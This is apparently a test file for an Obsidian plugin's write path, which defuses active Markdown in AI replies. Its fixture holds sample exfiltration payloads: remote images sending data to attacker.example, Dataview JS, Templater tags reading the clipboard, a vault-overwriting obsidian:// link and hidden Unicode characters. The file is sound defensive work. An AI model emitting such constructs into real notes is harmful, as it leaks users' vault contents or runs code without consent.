import { describe, expect, test } from "bun:test";
import { conversationToMarkdown } from "../src/output/conversationExport";
import { renderTemplate } from "../src/output/templates";
import type { FindingKind } from "../src/safety/findings";
import { assessModelMarkdownRisk, detectActiveContent, prepareModelOutputForWrite } from "../src/safety/writePath";

const ZWSP = "\u200B";

/** A reply that tries every route a note write could carry: remote loads, running plugins, templates, links. */
const EVIL_REPLY = [
	"# Notes",
	"",
	"![chart](https://attacker.example/p?d=secret)",
	"",
	"```dataviewjs",
	"dv.paragraph(app.vault.getName());",
	"```",
	"",
	"Inline: `$= dv.current().file.name` and `= this.file.name`.",
	"",
	"<% tp.system.clipboard() %>",
	"<%* tR += tp.file.title %>",
	"",
	"<img src=\"https://attacker.example/x.png\">",
	"",
	"[open vault](obsidian://new?file=Inbox&content=owned&overwrite=true)",
	"",
	"```mermaid",
	"flowchart TD",
	"  A@{ img: \"https://attacker.example/m.png\" }",
	"```",
	"",
	`hidden${ZWSP}text and rtl\u202Eoverride and tag\u{E0041}char`
].join("\n");

function assertDefused(text: string): void {
	expect(text).not.toMatch(/(?<!\\)!\[[^\]]*\]\(https?:/);
	expect(text).not.toContain("```dataviewjs");
	expect(text).not.toMatch(/`\s*\$=/);
	expect(text).not.toMatch(/`\s*=\s*this/);
	expect(text).not.toContain("<%");
	expect(text).not.toContain("<img");
	expect(text).not.toContain("](obsidian://");
	expect(text).not.toContain("```mermaid");
	expect(text).not.toMatch(/\u202E|\u{E0041}/u);
}

describe("prepareModelOutputForWrite", () => {
	test("defuses every active construct in an evil reply", () => {
		const result = prepareModelOutputForWrite(EVIL_REPLY);
		assertDefused(result.text);
		expect(result.changed).toBe(true);
		const expected: FindingKind[] = [
			"bidi-character", "blocked-link", "dataview-inline", "dataview-inline", "invisible-character", "invisible-character",
			"network-html", "plugin-fence", "remote-image", "template-tag", "template-tag", "unsafe-diagram"
		];
		expect(result.findings.map((finding) => finding.kind).sort()).toEqual(expected);
	});

	test("returns the very same text when there is nothing to defuse", () => {
		const text = "# Title\r\n\r\nPlain **text** with [a link](https://example.com), `code` and ![[local.png]].\r\n";
		const result = prepareModelOutputForWrite(text);
		expect(result).toEqual({ text, changed: false, findings: [] });
		expect(result.text).toBe(text);
	});

	test("keeps CRLF line endings when it has to change something", () => {
		const result = prepareModelOutputForWrite("Line one\r\n![x](https://attacker.example/p)\r\nLine three\r\n");
		expect(result.text).toBe("Line one\r\n[Remote image: x](https://attacker.example/p)\r\nLine three\r\n");
	});

	test("is idempotent: output that was already defused reports nothing", () => {
		const once = prepareModelOutputForWrite(EVIL_REPLY);
		const twice = prepareModelOutputForWrite(once.text);
		expect(twice.text).toBe(once.text);
		expect(twice.changed).toBe(false);
		expect(twice.findings).toEqual([]);
	});

	test("only neutralises constructs that the source text did not already hold", () => {
		const source = [
			"```dataviewjs",
			"dv.paragraph('mine');",
			"```",
			"",
			"Inline `= this.file.name` and <% tp.date.now() %>",
			"",
			"```mermaid",
			"%%{init: {\"theme\": \"dark\"}}%%",
			"flowchart TD",
			"  A --> B",
			"```",
			"",
			`Zero${ZWSP}width`
		].join("\n");
		const rewritten = `${source}\n\nMore text.`;
		const kept = prepareModelOutputForWrite(rewritten, { sourceText: source });
		expect(kept).toEqual({ text: rewritten, changed: false, findings: [] });
	});

	test("a construct the model added is still neutralised next to ones the source held", () => {
		const source = "```dataviewjs\ndv.paragraph('mine');\n```\n\nand <% tp.date.now() %>";
		const added = `${source}\n\n\`\`\`dataviewjs\ndv.paragraph(app.vault.getName());\n\`\`\`\n\nand <% tp.system.clipboard() %> and <% tp.date.now() %>`;
		const result = prepareModelOutputForWrite(added, { sourceText: source });
		expect(result.text.match(/```dataviewjs/g)?.length).toBe(1);
		expect(result.text).toContain("```text\ndv.paragraph(app.vault.getName());");
		expect(result.text.match(/<%/g)?.length).toBe(1);
		expect(result.text).toContain(`<${ZWSP}% tp.system.clipboard() %>`);
		// The output holds the source tag twice (once in the copied source, once added), so one copy is defused along with the new tag.
		expect(result.findings.map((finding) => finding.kind).sort()).toEqual(["plugin-fence", "template-tag", "template-tag"]);
	});

	test("one copy in the source exempts one copy in the output, not two", () => {
		const source = "Keep <% tp.date.now() %>.";
		const result = prepareModelOutputForWrite("Keep <% tp.date.now() %>.\nKeep <% tp.date.now() %>.", { sourceText: source });
		expect(result.text.match(/<%/g)?.length).toBe(1);
		expect(result.findings).toHaveLength(1);
	});

	test("lets the strict plugin diagram header through only when asked", () => {
		const header = "---\nconfig:\n  theme: base\n  layout: dagre\n---";
		const text = `\`\`\`mermaid\n${header}\nflowchart TD\n  A --> B\n\`\`\``;
		expect(prepareModelOutputForWrite(text).text).toStartWith("```text");
		expect(prepareModelOutputForWrite(text, { allowPluginMermaidHeader: true }).text).toBe(text);
	});

	test("removes invisible and bidi control characters but keeps joiners and direction marks used in real text", () => {
		const persian = "\u0645\u06CC\u200C\u062E\u0648\u0627\u0647\u0645 \u200F\u0633\u0644\u0627\u0645\u200E and a family \u{1F468}\u200D\u{1F469}\u200D\u{1F467}";
		expect(prepareModelOutputForWrite(persian).text).toBe(persian);
		expect(prepareModelOutputForWrite(`a${ZWSP}b\u2060c\uFEFFd\u180Ee`).text).toBe("abcde");
		expect(prepareModelOutputForWrite("x\u202Ay\u202Bz\u202Cq\u202Dr\u202Es\u2066t\u2067u\u2068v\u2069w").text).toBe("xyzqrstuvw");
		expect(prepareModelOutputForWrite("hide\u{E0049}\u{E0047}\u{E004E}\u{E004F}\u{E0052}\u{E0045}").text).toBe("hide");
	});

	test("defuses MathJax commands that load or link, once, and leaves the result alone on a second pass", () => {
		const first = prepareModelOutputForWrite("Value $\\href{https://attacker.example/?d=1}{x}$ and\n\n```math\n\\style{background:url(https://attacker.example/x)}{y}\n```");
		expect(first.text).not.toMatch(/\\(?:href|style)\{/);
		expect(first.findings.map((finding) => finding.kind)).toEqual(["math-command", "math-command"]);
		expect(prepareModelOutputForWrite(first.text)).toEqual({ text: first.text, changed: false, findings: [] });
	});

	test("defuses a template tag inside code too, because Templater reads the raw file", () => {
		const result = prepareModelOutputForWrite("```js\nconst t = '<% tp.file.title %>';\n```");
		expect(result.text).not.toContain("<%");
		expect(result.text).toContain("```js");
	});
});

describe("assessModelMarkdownRisk", () => {
	test("flags a risky reply and returns the safe text", () => {
		const assessment = assessModelMarkdownRisk(EVIL_REPLY);
		expect(assessment.risky).toBe(true);
		assertDefused(assessment.safeText);
		expect(assessment.findings.length).toBeGreaterThan(0);
	});

	test("does not flag ordinary Markdown", () => {
		const text = "# Heading\n\n- **bold** and [link](https://example.com) and [[Wiki Link]]\n\n```ts\nconst a = 1;\n```\n";
		expect(assessModelMarkdownRisk(text)).toEqual({ risky: false, safeText: text, findings: [] });
	});
});

describe("detectActiveContent", () => {
	test("names each kind of active content", () => {
		const kinds = (text: string): string[] => detectActiveContent(text).map((finding) => finding.kind);
		expect(kinds("![a](https://e.example/x.png)")).toEqual(["remote-image"]);
		expect(kinds("```dataview\nTABLE file.name\n```")).toEqual(["plugin-fence"]);
		expect(kinds("`$= dv.current()`")).toEqual(["dataview-inline"]);
		expect(kinds("<iframe src=\"https://e.example\"></iframe>")).toContain("network-html");
		expect(kinds("x <% tp.date.now() %> y")).toEqual(["template-tag"]);
		expect(kinds(`a${ZWSP}b`)).toEqual(["invisible-character"]);
		expect(kinds("a\u202Eb")).toEqual(["bidi-character"]);
		expect(kinds("[a](obsidian://open)")).toEqual(["blocked-link"]);
	});

	test("finds nothing in ordinary text", () => {
		expect(detectActiveContent("Just a sentence with `code` and a [link](https://example.com).")).toEqual([]);
		expect(detectActiveContent("")).toEqual([]);
	});

	test("reports lines and excerpts", () => {
		const [finding] = detectActiveContent("one\ntwo <% tp.date.now() %>\nthree");
		expect(finding).toMatchObject({ kind: "template-tag", line: 2 });
		expect(finding.excerpt).toContain("<%");
		expect(finding.message.length).toBeGreaterThan(10);
	});
});

describe("write helpers that carry model text", () => {
	test("conversationToMarkdown defuses assistant turns and leaves user turns as typed", () => {
		const markdown = conversationToMarkdown(
			[
				{ role: "user", text: "Show me ![x](https://attacker.example/p) and <% tp.date.now() %>" },
				{ role: "assistant", text: EVIL_REPLY }
			],
			{ title: "Chat", exportedAt: "2026-10-11T12:00:00.000Z" }
		);
		const assistant = markdown.slice(markdown.indexOf("## AskMate"));
		assertDefused(assistant);
		expect(markdown.slice(0, markdown.indexOf("## AskMate"))).toContain("![x](https://attacker.example/p)");
	});

	test("a template variable passed through the write path cannot carry a running construct", () => {
		const response = prepareModelOutputForWrite(EVIL_REPLY).text;
		const rendered = renderTemplate("## Response\n\n{{response}}\n", { response });
		assertDefused(rendered);
	});
});
